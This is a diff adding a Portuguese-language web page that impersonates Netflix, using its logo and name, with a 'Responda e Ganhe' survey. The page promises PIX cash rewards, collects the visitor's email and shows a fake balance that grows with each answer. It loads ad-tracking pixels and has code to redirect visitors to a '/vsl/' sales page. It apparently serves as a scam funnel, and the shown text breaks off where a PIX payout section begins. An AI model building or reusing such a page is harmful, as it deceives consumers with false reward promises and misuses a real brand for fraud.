@@ -1,0 +1,1435 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+</head><body>
+    
+    <script>
+        window.pixelId = "677c74c291b3f5fb998c50cc";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+      </script>
+        
+      
+      <!-- Meta Pixel Code -->
+      <script>
+        !function(f,b,e,v,n,t,s)
+        {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+        n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+        if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+        n.queue=[];t=b.createElement(e);t.async=!0;
+        t.src=v;s=b.getElementsByTagName(e)[0];
+        s.parentNode.insertBefore(t,s)}(window, document,'script',
+        'https://connect.facebook.net/en_US/fbevents.js');
+        fbq('init', '466842849697857');
+        fbq('track', 'PageView');
+        </script>
+        <noscript><img height="1" width="1" style="display:none"
+        src="https://www.facebook.com/tr?id=466842849697857&ev=PageView&noscript=1"
+        /></noscript>
+        <!-- End Meta Pixel Code -->
+         
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NetflixAvalie - Responda e Ganhe</title>
+    <link href="css2.html" rel="stylesheet">
+    <link rel="stylesheet" href="css/all.min.css">
+    <link rel="stylesheet" href="css/plyr.css">
+    <script src="js/jquery-3.6.0.min.js"></script>
+    <script src="js/bootstrap.min.js"></script>
+    <script src="js/plyr.polyfilled.js"></script>
+
+
+    <style>
+        .loading-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.95);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            border-radius: 20px;
+        }
+
+        .loading-spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid rgba(130, 10, 209, 0.1);
+            border-radius: 50%;
+            border-top-color: #FF0000;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #000000 0%, #000000 100%);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 10px;
+        }
+
+        .login-container, .quiz-container {
+            background: rgba(255, 255, 255, 0.98);
+            padding: 25px 15px;
+            border-radius: 20px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
+            width: 98%;
+            max-width: 600px;
+            text-align: center;
+            backdrop-filter: blur(10px);
+        }
+
+        .login-container {
+            position: relative;
+            background: rgba(255, 255, 255, 0.98);
+            padding: 25px 15px;
+            border-radius: 20px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
+            width: 98%;
+            max-width: 600px;
+            text-align: center;
+            backdrop-filter: blur(10px);
+        }
+
+        .quiz-container {
+            display: none;
+            text-align: left;
+            padding: 20px;
+        }
+
+        .quiz-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid rgba(130, 10, 209, 0.1);
+        }
+
+        .user-info {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .user-avatar {
+            width: 40px;
+            height: 40px;
+            background: #000000;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: 600;
+            font-size: 16px;
+        }
+
+        .balance-info {
+            text-align: right;
+        }
+
+        .balance-label {
+            font-size: 12px;
+            color: #666;
+        }
+
+        .balance-amount {
+            font-size: 18px;
+            font-weight: 600;
+            color: #FF0000;
+        }
+
+        .question-container {
+            background: linear-gradient(135deg, #ffffff 0%, #f8f8f8 100%);
+            border: 1px solid rgba(130, 10, 209, 0.1);
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 15px;
+            box-shadow: 0 4px 15px rgba(130, 10, 209, 0.05);
+            transition: all 0.3s ease;
+        }
+
+        .question-container:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(130, 10, 209, 0.08);
+        }
+
+        .question-text {
+            font-size: 16px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+
+        .options-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            animation: fadeIn 0.5s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes balanceIncrease {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.2); color: #00ff00; }
+            100% { transform: scale(1); }
+        }
+
+        .balance-increase {
+            animation: balanceIncrease 0.8s ease;
+        }
+
+        .option-button {
+            background: white;
+            border: 2px solid rgba(130, 10, 209, 0.15);
+            border-radius: 12px;
+            padding: 12px 15px;
+            font-size: 14px;
+            color: #333;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .option-button:hover {
+            background: rgba(130, 10, 209, 0.05);
+            border-color: #FF0000;
+            transform: translateY(-1px);
+        }
+
+        .option-button.selected {
+            background: linear-gradient(45deg, #000000, #FF0000);
+            color: white;
+            border-color: transparent;
+            transform: scale(0.98);
+        }
+
+        .reward-popup {
+            position: fixed;
+            top: 15px;
+            right: 15px;
+            background: linear-gradient(45deg, #00c853, #69f0ae);
+            color: white;
+            padding: 10px 15px;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 14px;
+            box-shadow: 0 4px 15px rgba(0, 200, 83, 0.3);
+            animation: slideIn 0.5s ease, slideOut 0.5s ease 2.5s forwards;
+            z-index: 1000;
+        }
+
+        @keyframes slideIn {
+            from { transform: translateX(100%); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+
+        @keyframes slideOut {
+            from { transform: translateX(0); opacity: 1; }
+            to { transform: translateX(100%); opacity: 0; }
+        }
+
+        .custom-select-wrapper {
+            position: relative;
+            width: 100%;
+            margin-bottom: 10px;
+        }
+
+        .custom-select {
+            position: relative;
+            width: 100%;
+        }
+
+        .custom-select-trigger {
+            position: relative;
+            display: block;
+            width: 100%;
+            padding: 12px;
+            font-size: 14px;
+            color: #333;
+            background: #fff;
+            border: 1px solid rgba(130, 10, 209, 0.2);
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            text-align: left;
+        }
+
+        .custom-select-trigger:hover {
+            border-color: #FF0000;
+        }
+
+        .custom-select-trigger:after {
+            content: '';
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 12px;
+            height: 12px;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath fill='%23820AD1' d='M2.293 4.293a1 1 0 0 1 1.414 0L6 6.586l2.293-2.293a1 1 0 1 1 1.414 1.414l-3 3a1 1 0 0 1-1.414 0l-3-3a1 1 0 0 1 0-1.414z'/%3E%3C/svg%3E");
+            transition: transform 0.3s ease;
+        }
+
+        .custom-select.open .custom-select-trigger:after {
+            transform: translateY(-50%) rotate(180deg);
+        }
+
+        .custom-options {
+            position: absolute;
+            display: none;
+            top: 100%;
+            left: 0;
+            right: 0;
+            background: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            border: 1px solid rgba(130, 10, 209, 0.2);
+            z-index: 2000;
+            margin-top: 5px;
+            max-height: 200px;
+            overflow-y: auto;
+        }
+
+        .custom-select.open .custom-options {
+            display: block;
+        }
+
+        .custom-option {
+            position: relative;
+            padding: 12px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .custom-option:hover {
+            background: rgba(130, 10, 209, 0.05);
+            color: #FF0000;
+        }
+
+        .custom-option.selected {
+            background: rgba(130, 10, 209, 0.1);
+            color: #FF0000;
+        }
+
+        .progress-bar {
+            height: 6px;
+            background: #F0F0F5;
+            border-radius: 3px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(45deg, #000000, #FF0000);
+            width: 0%;
+            transition: width 0.5s ease;
+            border-radius: 3px;
+        }
+
+        .reward-info {
+            text-align: center;
+            font-size: 12px;
+            color: #666;
+            margin-top: 10px;
+        }
+
+        .feedback-message {
+            font-size: 13px;
+            color: #666;
+            margin-top: 10px;
+            font-style: italic;
+        }
+
+        @media (max-width: 480px) {
+            .options-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .balance-amount {
+                font-size: 16px;
+            }
+            
+            .question-text {
+                font-size: 13px;
+            }
+            
+            .option-button {
+                font-size: 12px;
+                padding: 8px;
+            }
+        }
+
+        .logo {
+            margin-bottom: 15px;
+        }
+
+        .logo svg {
+            fill: #FF0000;
+            width: 50px;
+            height: 28px;
+        }
+
+        .reward-badge {
+            background: linear-gradient(135deg, #F0F0F5 0%, #FFFFFF 100%);
+            border: 1px solid rgba(130, 10, 209, 0.15);
+            border-radius: 12px;
+            padding: 12px 15px;
+            margin: 12px auto;
+            width: 98%;
+            max-width: 500px;
+            box-shadow: 0 2px 8px rgba(130, 10, 209, 0.06);
+            position: relative;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .reward-badge::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 3px;
+            height: 100%;
+            background: linear-gradient(45deg, #000000, #FF0000);
+        }
+
+        .reward-badge span {
+            color: #FF0000;
+            font-weight: 600;
+            font-size: 15px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            padding-left: 5px;
+        }
+
+        .reward-badge i {
+            font-size: 16px;
+            color: #FF0000;
+        }
+
+        h1 {
+            color: #111;
+            font-size: 22px;
+            margin-bottom: 10px;
+            font-weight: 700;
+            width: 98%;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        p {
+            color: #666;
+            margin-bottom: 15px;
+            font-size: 14px;
+            width: 98%;
+            margin-left: auto;
+            margin-right: auto;
+            line-height: 1.4;
+        }
+
+        input {
+            width: 98%;
+            padding: 14px;
+            margin-bottom: 12px;
+            border: 2px solid #E5E5E5;
+            border-radius: 10px;
+            font-size: 14px;
+            outline: none;
+            font-family: 'Inter', sans-serif;
+            transition: all 0.3s ease;
+        }
+
+        input:focus {
+            border-color: #FF0000;
+            box-shadow: 0 0 0 3px rgba(130, 10, 209, 0.1);
+        }
+
+        button {
+            width: 98%;
+            padding: 14px;
+            background: linear-gradient(45deg, #000000, #FF0000);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-family: 'Inter', sans-serif;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(130, 10, 209, 0.3);
+        }
+
+        .exclusive-tag {
+            background: #FF0000;
+            color: white;
+            padding: 3px 10px;
+            border-radius: 15px;
+            font-size: 11px;
+            font-weight: 500;
+            display: inline-block;
+            margin-bottom: 10px;
+        }
+
+        .terms {
+            font-size: 11px;
+            color: #666;
+            margin-top: 12px;
+            width: 98%;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        @media (max-width: 480px) {
+            body {
+                padding: 10px;
+            }
+            
+            .login-container {
+                padding: 20px 12px;
+            }
+
+            h1 {
+                font-size: 20px;
+            }
+
+            .reward-badge {
+                padding: 10px;
+                margin: 10px auto;
+            }
+
+            .reward-badge span {
+                font-size: 13px;
+                gap: 4px;
+            }
+
+            .reward-badge i {
+                font-size: 14px;
+            }
+
+            input, button {
+                padding: 12px;
+            }
+        }
+
+        .pix-compact-container {
+            padding: 15px;
+            max-width: 350px;
+            margin: 0 auto;
+            text-align: center;
+        }
+
+        .pix-title {
+            color: #FF0000;
+            margin-bottom: 10px;
+            font-size: 20px;
+            font-weight: 600;
+        }
+
+        .pix-subtitle {
+            margin-bottom: 10px;
+            font-size: 14px;
+            color: #333;
+        }
+
+        .pix-amount {
+            font-size: 28px;
+            font-weight: 700;
+            color: #FF0000;
+            margin-bottom: 15px;
+        }
+
+        .pix-select {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid rgba(130, 10, 209, 0.2);
+            border-radius: 8px;
+            margin-bottom: 10px;
+            font-size: 14px;
+            background: #fff;
+            cursor: pointer;
+            appearance: none;
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath fill='%23820AD1' d='M2.293 4.293a1 1 0 0 1 1.414 0L6 6.586l2.293-2.293a1 1 0 1 1 1.414 1.414l-3 3a1 1 0 0 1-1.414 0l-3-3a1 1 0 0 1 0-1.414z'/%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right 12px center;
+            padding-right: 35px;
+            transition: all 0.2s ease;
+        }
+
+        .pix-select:hover {
+            border-color: #FF0000;
+        }
+
+        .pix-select:focus {
+            outline: none;
+            border-color: #FF0000;
+            box-shadow: 0 0 0 2px rgba(130, 10, 209, 0.1);
+        }
+
+        .pix-key-input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            font-size: 14px;
+        }
+
+        .pix-button {
+            width: 100%;
+            padding: 12px;
+            background: #FF0000;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        .pix-button:hover {
+            background: #6b09ac;
+        }
+
+        .pix-info {
+            margin-top: 10px;
+            font-size: 12px;
+            color: #666;
+        }
+
+        .pix-success-container {
+            padding: 15px;
+            max-width: 350px;
+            margin: 0 auto;
+            text-align: center;
+        }
+
+        .pix-success-icon {
+            font-size: 40px;
+            color: #00c853;
+            margin-bottom: 15px;
+        }
+
+        .pix-success-title {
+            color: #FF0000;
+            margin-bottom: 12px;
+            font-size: 18px;
+        }
+
+        .pix-info-box {
+            background: rgba(130, 10, 209, 0.05);
+            border-radius: 8px;
+            padding: 12px;
+            margin: 10px 0;
+        }
+
+        .pix-info-label {
+            margin-bottom: 8px;
+            font-size: 13px;
+            color: #333;
+        }
+
+        .pix-info-value {
+            color: #FF0000;
+            font-weight: 600;
+            font-size: 16px;
+            margin: 0;
+            word-break: break-all;
+        }
+
+        .error-popup {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            padding: 20px;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
+            z-index: 2000;
+            text-align: center;
+            width: 90%;
+            max-width: 300px;
+        }
+
+        .error-popup h3 {
+            color: #FF0000;
+            margin: 0 0 12px 0;
+            font-size: 16px;
+            font-weight: 600;
+            letter-spacing: -0.3px;
+        }
+
+        .error-popup p {
+            color: #666;
+            margin: 0 0 15px 0;
+            font-size: 14px;
+            line-height: 1.4;
+            padding: 0 5px;
+        }
+
+        .error-button {
+            background: #FF0000;
+            color: white;
+            border: none;
+            padding: 12px 0;
+            border-radius: 8px;
+            font-weight: 500;
+            font-size: 14px;
+            cursor: pointer;
+            transition: all 0.3s;
+            width: 100%;
+            letter-spacing: -0.2px;
+        }
+
+        .error-button:hover {
+            background: #6b09ac;
+            transform: translateY(-1px);
+        }
+
+        @media (max-width: 480px) {
+            .error-popup {
+                width: 85%;
+                padding: 15px;
+                max-width: 280px;
+            }
+
+            .error-popup h3 {
+                font-size: 15px;
+                margin-bottom: 10px;
+            }
+
+            .error-popup p {
+                font-size: 13px;
+                margin-bottom: 12px;
+            }
+
+            .error-button {
+                font-size: 13px;
+                padding: 10px 0;
+            }
+        }
+
+        .video-title {
+            color: #FF0000;
+            text-align: center;
+            font-size: 15px;
+            font-weight: 600;
+            line-height: 1.3;
+            margin: 0 auto;
+            padding: 12px 20px;
+            background: #fff;
+            max-width: 320px;
+            letter-spacing: -0.3px;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+        }
+
+        @media (max-width: 480px) {
+            .video-title {
+                font-size: 14px;
+                padding: 10px 15px;
+            }
+        }
+
+        .unlock-button {
+            background: #FF0000;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 6px;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 10px;
+            width: 100%;
+            text-align: center;
+        }
+
+        .unlock-button:hover {
+            background: #6b09ac;
+            transform: translateY(-1px);
+        }
+
+        .plyr {
+            border-radius: 6px;
+            overflow: hidden;
+            --plyr-color-main: #FF0000;
+        }
+
+        .plyr--video {
+            height: 180px;
+        }
+
+        /* Mobile optimizations */
+        @media (max-width: 480px) {
+            .video-modal {
+                padding: 12px;
+                width: 90%;
+                max-width: 300px;
+            }
+
+            .video-title {
+                font-size: 13px;
+                margin-bottom: 12px;
+            }
+
+            .unlock-button {
+                padding: 8px 16px;
+                font-size: 13px;
+            }
+
+            .plyr--video {
+                height: 160px;
+            }
+        }
+
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 1999;
+        }
+
+        .video-container {
+            width: 100%;
+            margin: 15px 0;
+            border-radius: 6px;
+            overflow: hidden;
+            background: #000;
+        }
+
+        .video-title {
+            color: #333;
+            text-align: center;
+            font-size: 14px;
+            font-weight: 600;
+            line-height: 1.3;
+            margin: 10px 0;
+        }
+
+        .unlock-button {
+            background: #FF0000;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 6px;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            transition: all 0.3s;
+            width: 100%;
+            text-align: center;
+            display: none;
+        }
+
+        .unlock-button:hover {
+            background: #6b09ac;
+        }
+
+        .plyr {
+            border-radius: 6px;
+            overflow: hidden;
+            --plyr-color-main: #FF0000;
+        }
+
+        .plyr--video {
+            height: 180px;
+        }
+
+        /* Hide all controls except play button */
+        .plyr__controls button[data-plyr="play"] {
+            background: rgba(130, 10, 209, 0.8) !important;
+            width: 60px !important;
+            height: 60px !important;
+            border-radius: 50% !important;
+        }
+
+        .plyr__controls button[data-plyr="play"] svg {
+            width: 24px !important;
+            height: 24px !important;
+        }
+
+        .plyr--video .plyr__controls {
+            padding: 0 !important;
+            background: none !important;
+        }
+
+        .plyr__control--overlaid {
+            background: rgba(130, 10, 209, 0.8) !important;
+        }
+
+        /* Hide all other controls */
+        .plyr__controls > *:not(button[data-plyr="play"]),
+        .plyr__time,
+        .plyr__progress,
+        .plyr__menu,
+        .plyr__volume,
+        .plyr__tooltip {
+            display: none !important;
+        }
+
+        .video-section {
+            padding: 0;
+            text-align: center;
+            width: 100%;
+            max-width: 100%;
+            margin: 0;
+            background: #fff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .video-section .quiz-header {
+            display: none;
+        }
+
+        .video-container {
+            width: 100%;
+            margin: 0;
+            overflow: hidden;
+            background: #000;
+            position: relative;
+            aspect-ratio: 16/9;
+        }
+
+        .video-title {
+            color: #333;
+            text-align: center;
+            font-size: 15px;
+            font-weight: 600;
+            line-height: 1.4;
+            margin: 15px 0;
+            padding: 0 15px;
+            background: #fff;
+        }
+
+        .unlock-button {
+            background: #FF0000;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            transition: all 0.3s;
+            width: 100%;
+            margin: 15px 0;
+            letter-spacing: -0.2px;
+        }
+
+        .unlock-button:hover {
+            background: #6b09ac;
+            transform: translateY(-1px);
+        }
+
+        @media (max-width: 480px) {
+            .unlock-button {
+                font-size: 13px;
+                padding: 10px 15px;
+                margin: 12px 0;
+            }
+        }
+
+        .plyr {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            --plyr-color-main: #FF0000;
+        }
+
+        /* Center play button */
+        .plyr__control--overlaid {
+            background: rgba(130, 10, 209, 0.9) !important;
+            padding: 20px !important;
+            border: none !important;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+
+        .plyr__control--overlaid svg {
+            width: 25px !important;
+            height: 25px !important;
+        }
+
+        /* Hide all controls except big play button */
+        .plyr--video .plyr__controls {
+            display: none !important;
+        }
+    </style>
+
+
+    <div class="login-container" id="login-section">
+        <div class="loading-overlay" id="loadingOverlay">
+            <div class="loading-spinner"></div>
+        </div>
+        <div class="logo">
+            <svg height="27.1" viewBox="0.238 0.034 919.406 248.488" width="100" xmlns="http://www.w3.org/2000/svg">
+    <path d="m870.46 118.314 49.184 130.208c-14.495-2.07-28.982-4.663-43.733-6.999l-27.707-71.945-28.468 66.006c-13.973-2.336-27.698-3.114-41.672-4.928l49.955-113.89L782.71.034h41.937l25.362 65.22L877.194.034h42.442zM749.596.034h-38.052v225.71c12.425.779 25.362 1.292 38.052 2.841zm-70.927 223.118c-34.68-2.328-69.37-4.39-104.829-5.177V.035h38.823v181.188c22.264.514 44.52 2.32 66.006 3.355zM532.417 88.305v38.822h-53.06v88.263h-38.3V.034H549.77v38.822h-70.405v49.45h53.06zM375.82 38.856v178.605c-12.946 0-26.14 0-38.83.514V38.856h-40.122V.034H416.19v38.822zM254.94 129.19c-17.08 0-37.274 0-51.769.787v57.715c22.778-1.557 45.556-3.363 68.59-4.141v37.273l-107.412 8.548V.034h107.405v38.822H203.17v52.29c15.017 0 38.052-.778 51.768-.778v38.83zM39.831 107.447V243.08c-13.965 1.557-26.398 3.371-39.593 5.442V.034h37.017L87.724 141.11V.034h38.83V232.47c-13.717 2.336-27.698 3.114-42.45 5.177z" fill="#e50914"></path>
+</svg>
+
+        </div>
+        <span class="exclusive-tag">Acesso Exclusivo</span>
+        <h1>Responda e Ganhe</h1>
+        <p>Você foi selecionado para participar do nosso programa exclusivo! Responda perguntas sobre a Netflix e receba recompensas via PIX.</p>
+        <div class="reward-badge">
+            <span><i class="fas fa-money-bill-wave"></i>Recompensa disponível: R$ 20,00</span>
+        </div>
+        <input type="email" placeholder="Digite seu e-mail" aria-label="Email" id="cpf-input" required="">
+        <button onclick="validateAndStart()">Participar Agora</button>
+        <p class="terms">Apenas usuários selecionados podem participar. Suas respostas ajudarão a melhorar nossos serviços.</p>
+    </div>
+
+    <div class="quiz-container" id="quiz-section">
+        <div class="quiz-header">
+            <div class="user-info">
+                <div class="user-avatar">
+                    <img src="images/nu-icon.png" alt="Netflix" style="width: 24px; height: 24px;">
+                </div>
+                <span>Netflix</span>
+            </div>
+            <div class="balance-info">
+                <div class="balance-label">Saldo Atual</div>
+                <div class="balance-amount">R$ 20,00</div>
+            </div>
+        </div>
+
+        <div class="progress-bar">
+            <div class="progress-fill"></div>
+        </div>
+
+        <div class="question-container">
+            <div class="question-text"></div>
+            <div class="options-grid"></div>
+        </div>
+
+        <div class="reward-info">
+            Responda para ganhar de R$ 20 a R$ 40
+        </div>
+    </div>
+    <script>
+        function redirecionar(event) {
+            event.preventDefault(); // Previne o redirecionamento imediato
+    
+            const baseUrl = new URL('/vsl/', window.location.origin);
+            const currentParams = new URLSearchParams(window.location.search);
+    
+            // Adicionar apenas os parâmetros que ainda não estão no link
+            for (const [key, value] of currentParams.entries()) {
+                if (!baseUrl.searchParams.has(key)) {
+                    baseUrl.searchParams.append(key, value);
+                }
+            }
+    
+            // Redirecionar preservando os parâmetros
+            window.location.href = baseUrl.toString();
+        }
+    </script>
+    
+    
+
+    <script>
+        function validateAndStart() {
+            const emailInput = document.getElementById('cpf-input').value;
+            const loadingOverlay = document.getElementById('loadingOverlay');
+            
+            if (!emailInput) {
+                alert('Por favor, digite seu e-mail');
+                return;
+            }
+
+            if (!emailInput.includes('@')) {
+                alert('Por favor, digite um e-mail válido');
+                return;
+            }
+
+            loadingOverlay.style.display = 'flex';
+            
+            setTimeout(() => {
+                loadingOverlay.style.display = 'none';
+                document.getElementById('login-section').style.display = 'none';
+                startQuiz();
+            }, 1500);
+        }
+
+        function startQuiz() {
+            document.getElementById('quiz-section').style.display = 'block';
+            showQuestion();
+            updateProgress();
+        }
+
+        const questions = [
+            {
+                question: "Com que frequência você assiste à Netflix?",
+                options: ["Algumas vezes por mês", "Raramente", "Algumas vezes por semana", "Todos os dias"],
+                reward:20 + 10 ,
+                feedback: "Sua opinião é importante para melhorarmos nossos conteúdos"
+            },
+            {
+                question: "Que tipo de conteúdo você mais assiste na Netflix?",
+                options: ["Animações", "Documentários", "Séries", "Filmes"],
+                reward: 10,
+                feedback: "Seu feedback nos ajuda a melhorar nossa experiência"
+            },
+            {
+                question: "O catálogo da Netflix atende às suas expectativas?",
+                options: ["Sim", "Não", "A maioria das vezes", "Precisa melhorar"],
+                reward: 15,
+                feedback: "Sua avaliação nos ajuda a aprimorar nosso atendimento"
+            },
+            {
+                question: "Como você avalia a qualidade das produções originais da Netflix?",
+                options: ["Boas", "Ruins", "Razoáveis", "Excelentes"],
+                reward: 18,
+                feedback: "Agradecemos sua sinceridade"
+            },
+            {
+                question: "Você acha que o preço da assinatura da Netflix vale a pena?",
+                options: ["Sim, vale cada centavo", "Podia ser mais barato", "Não, acho caro", "Não, estou pensando em cancelar"],
+                reward: 22,
+                feedback: "Suas sugestões são valiosas para nosso desenvolvimento"
+            },
+            {
+                question: "Como você avalia o app da Netflix?",
+                options: ["Muito intuitivo", "Fácil de usar", "Um pouco confuso", "Precisa melhorar"],
+                reward: 19,
+                feedback: "Seu feedback nos ajuda a melhorar a experiência do app"
+            },
+            {
+                question: "Se pudesse dar uma nota para a Netflix de 0 a 10, qual seria?",
+                options: ["(A) 9 ou 10", "(B) 7 ou 8", "(C) 5 ou 6", "(D) 0 a 4"],
+                reward: 17,
+                feedback: "Seu feedback ajuda a melhorar nossos produtos"
+            },
+            {
+                question: "Como você avalia a Netflix em relação a outros streamings?",
+                options: ["Muito melhores", "Melhores", "Similares", "Piores"],
+                reward: 14,
+                feedback: "Sua opinião nos ajuda a manter preços competitivos"
+            },
+            {
+                question: "Você já teve problemas com pagamentos na Netflix",
+                options: ["Nunca", "Uma vez", "Algumas vezes", "Frequentemente"],
+                reward: 13,
+                feedback: "Sua segurança é nossa prioridade"
+            },
+            {
+                question: "Como você avalia as recomendações da Netflix",
+                options: ["Muito útil", "Útil", "Pouco útil", "Nunca uso"],
+                reward: 24,
+                feedback: "Seu feedback ajuda a melhorar nossas opções de pagamento"
+            },
+            {
+                question: "Você assiste Netflix em viagens?",
+                options: ["Sempre", "Às vezes", "Raramente", "Nunca"],
+                reward: 22,
+                feedback: "Suas respostas nos ajudam a melhorar as ferramentas"
+            },
+            {
+                question: "O que você acha das notificações do app?",
+                options: ["Muito úteis", "Adequadas", "Excessivas", "Desnecessárias"],
+                reward: 26,
+                feedback: "Seu feedback ajuda a otimizar nossas comunicações"
+            }
+        ];
+
+        // Total rewards sum: R$ 230,00
+
+        let currentQuestion = 0;
+        let totalEarned = 0;
+        let isAnswering = false; // Flag to prevent double clicks
+
+        function showQuestion() {
+            const question = questions[currentQuestion];
+            document.querySelector('.question-text').textContent = question.question;
+            
+            const optionsGrid = document.querySelector('.options-grid');
+            optionsGrid.innerHTML = '';
+            
+            question.options.forEach((option, index) => {
+                const button = document.createElement('button');
+                button.className = 'option-button';
+                button.textContent = option;
+                button.onclick = () => selectAnswer(index);
+                optionsGrid.appendChild(button);
+            });
+
+            updateProgress();
+        }
+
+        function selectAnswer(selectedIndex) {
+            if (isAnswering) return; // Prevent double clicks
+            isAnswering = true;
+
+            const question = questions[currentQuestion];
+            const buttons = document.querySelectorAll('.option-button');
+            
+            buttons.forEach(button => button.classList.remove('selected'));
+            buttons[selectedIndex].classList.add('selected');
+
+            // Add feedback message
+            const feedbackDiv = document.createElement('div');
+            feedbackDiv.className = 'feedback-message';
+            feedbackDiv.textContent = question.feedback;
+            document.querySelector('.options-grid').appendChild(feedbackDiv);
+
+            // Add reward
+            totalEarned += question.reward;
+            const balanceElement = document.querySelector('.balance-amount');
+            balanceElement.classList.add('balance-increase');
+            balanceElement.textContent = `R$ ${totalEarned},00`;
+
+            // Show reward popup
+            const popup = document.createElement('div');
+            popup.className = 'reward-popup';
+            popup.textContent = `+R$ ${question.reward},00`;
+            document.body.appendChild(popup);
+
+            // Disable all buttons
+            buttons.forEach(button => button.style.pointerEvents = 'none');
+
+            setTimeout(() => {
+                popup.remove();
+                balanceElement.classList.remove('balance-increase');
+                
+                currentQuestion++;
+                if (currentQuestion < questions.length) {
+                    showQuestion();
+                } else {
+                    finishQuiz();
+                }
+                isAnswering = false; // Reset the flag after transition
+            }, 2000);
+        }
+
+        function updateProgress() {
+            const progress = (currentQuestion / questions.length) * 100;
+            document.querySelector('.progress-fill').style.width = `${progress}%`;
+        }
+
+        function finishQuiz() {
+            // Hide progress elements if they exist
+            const progressBar = document.querySelector('.progress-bar');
+            const progressContainer = document.querySelector('.progress-container');
+            const rewardInfo = document.querySelector('.reward-info');
+            
+            if (progressBar) progressBar.style.display = 'none';
+            if (progressContainer) progressContainer.style.display = 'none';
+            if (rewardInfo) rewardInfo.style.display = 'none';
+            
+            document.querySelector('.question-container').innerHTML = `
+                <div class="pix-compact-container">
